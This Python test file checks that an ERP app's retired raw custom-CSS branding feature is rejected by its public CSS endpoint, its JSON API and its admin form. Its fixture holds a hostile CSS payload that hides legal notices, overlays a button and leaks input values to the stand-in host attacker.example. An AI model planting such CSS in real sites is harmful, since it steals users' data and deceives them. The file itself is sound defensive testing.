"""Route-level canaries for the raw-CSS retirement (ADR-0006 D8).

`tests/services/test_branding_no_raw_css.py` pins the unit-level properties.
These prove the same thing through the actual delivery surfaces, which is where
the vulnerability lived:

1. the PUBLIC `GET /settings/branding/org/{org_id}/css` endpoint never serves a
   stored hostile value — that endpoint carries no auth dependency at all, and
   it plus the login/careers page renders were the delivery path;
2. the JSON API refuses a raw-CSS write with 422 rather than accepting it;
3. the admin HTML form refuses it with a VISIBLE error and does NOT redirect —
   `extra="forbid"` never sees that path, so a silent drop plus a 303 would tell
   an operator their CSS was saved when it was not.

(3) is the easy one to regress: the form path writes branding fields with
`setattr` and bypasses the pydantic schemas entirely.

These deliberately avoid the database. The SQLite test DB does not carry ERP's
schema-qualified `main.organization` / branding tables, and none of the three
properties actually depend on persistence: the CSS endpoint's data source is
faked at the service boundary, schema validation runs before any query, and the
form-path rejection happens before the first DB call. Testing them without a DB
also means they cannot rot into "passed because the table was missing".
"""

from __future__ import annotations

import uuid

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from app.api.settings import router as settings_api_router
from app.models.finance.core_org.organization_branding import OrganizationBranding
from app.services.admin.settings_web import admin_settings_web_service
from app.services.finance.branding import BrandingService

HOSTILE_CSS = (
    "footer, .legal-notice { display: none !important; }\n"
    ".btn-danger { position: fixed; top: 0; z-index: 99999; }\n"
    'input[value^="a"] { background: url(https://attacker.example/leak); }'
)

ORG_ID = uuid.UUID("00000000-0000-0000-0000-0000000000aa")


def _hostile_branding() -> OrganizationBranding:
    """An unsaved branding row whose RETIRED column still holds a hostile value.

    This is the realistic post-fix state: the column is deliberately kept so
    operators can export what they had, so every surface must stay safe with the
    data present — not merely because nothing writes it any more.
    """
    return OrganizationBranding(
        organization_id=ORG_ID,
        display_name="Acme",
        primary_color="#0D9488",
        custom_css=HOSTILE_CSS,
    )


@pytest.fixture()
def api_client(monkeypatch):
    """The settings API router alone, with its DB and permission dependencies
    stubbed, and the branding lookup returning the hostile row above."""
    from app.api.deps import get_db_admin_bypass

    monkeypatch.setattr(
        BrandingService, "get_by_org_id", lambda self, org_id: _hostile_branding()
    )

    app = FastAPI()
    app.include_router(settings_api_router, prefix="/api/v1")
    app.dependency_overrides[get_db_admin_bypass] = lambda: None

    # `require_permission(...)` builds a fresh closure per route, so override by
    # callable identity across every mounted dependant rather than by name.
    for route in app.routes:
        dependant = getattr(route, "dependant", None)
        for dep in getattr(dependant, "dependencies", []):
            if dep.call is not None and "permission" in dep.call.__name__.lower():
                app.dependency_overrides[dep.call] = lambda: {"user_id": None}

    with TestClient(app) as client:
        yield client

    app.dependency_overrides.clear()


# ── 1. The public CSS endpoint never serves a stored hostile value ──────────


def test_public_css_endpoint_never_serves_stored_raw_css(api_client):
    response = api_client.get(f"/api/v1/settings/branding/org/{ORG_ID}/css")

    assert response.status_code == 200, response.text
    body = response.text
    assert "attacker.example" not in body
    assert "display: none" not in body
    assert "z-index: 99999" not in body
    # The generated branding is still served — this is a removal, not an outage.
    assert "--teal:" in body


# ── 2. The JSON API refuses a raw-CSS write ─────────────────────────────────


def test_api_create_rejects_raw_css_with_422(api_client):
    response = api_client.post(
        "/api/v1/settings/branding",
        json={
            "organization_id": str(uuid.uuid4()),
            "display_name": "Acme",
            "custom_css": HOSTILE_CSS,
        },
    )
    assert response.status_code == 422, response.text
    assert "custom_css" in response.text


def test_api_update_rejects_raw_css_with_422(api_client):
    response = api_client.put(
        f"/api/v1/settings/branding/{uuid.uuid4()}",
        json={"custom_css": HOSTILE_CSS},
    )
    # 422 (validation) must come BEFORE any 404 for a missing row — the point is
    # that the payload never reaches the service.
    assert response.status_code == 422, response.text
    assert "custom_css" in response.text


def test_api_still_accepts_legitimate_branding_writes(api_client):
    """Sensitivity check on `extra="forbid"`: it must reject the retired field
    without breaking ordinary branding writes. A legitimate payload must get
    PAST validation — whatever the service then does with a stub DB."""
    response = api_client.post(
        "/api/v1/settings/branding",
        json={
            "organization_id": str(uuid.uuid4()),
            "display_name": "Acme",
            "primary_color": "#0D9488",
        },
    )
    assert response.status_code != 422, response.text


# ── 3. The admin HTML form refuses it visibly, and does NOT redirect ────────
#
# The route (`app.web.admin.admin_settings_branding_update`) turns a
# `(False, message)` from the service into a re-rendered page carrying
# `context["error"]` — a 200 with a visible message — whereas success produces a
# 303 redirect. Asserting the service contract is therefore asserting the
# operator-visible outcome, without standing up the whole admin template stack.


class _NoDB:
    """A DB stand-in that fails loudly if touched — proving the rejection
    happens BEFORE any query, which is what makes it safe to run DB-free."""

    def get(self, *args, **kwargs):  # pragma: no cover - must not be reached
        raise AssertionError(
            "update_branding queried the database before rejecting raw CSS"
        )


def test_admin_form_rejects_raw_css_visibly_and_does_not_redirect():
    success, error = admin_settings_web_service.update_branding(
        _NoDB(),
        ORG_ID,
        {"display_name": "Acme", "custom_css": HOSTILE_CSS},
    )

    assert success is False, "a raw-CSS submission must not report success"
    assert error, "the operator must be told why, not silently ignored"
    assert "custom css" in error.lower()
    # `success is False` is exactly what makes the route re-render with an error
    # instead of returning its 303 — see the route's `if not success:` branch.


def test_admin_form_rejection_is_specific_to_raw_css():
    """Sensitivity check: a legitimate payload must get PAST the CSS gate. It
    then hits the DB, which `_NoDB` refuses — reaching that assertion is the
    proof it was not short-circuited by the raw-CSS check."""
    with pytest.raises(AssertionError, match="queried the database"):
        admin_settings_web_service.update_branding(
            _NoDB(),
            ORG_ID,
            {"display_name": "Acme", "primary_color": "#0D9488"},
        )


def test_empty_custom_css_field_is_not_treated_as_a_submission():
    """A stale client posting an empty `custom_css` must not be rejected — only
    a real value is. Same proof: it must reach the DB call."""
    with pytest.raises(AssertionError, match="queried the database"):
        admin_settings_web_service.update_branding(
            _NoDB(),
            ORG_ID,
            {"display_name": "Acme", "custom_css": "   "},
        )
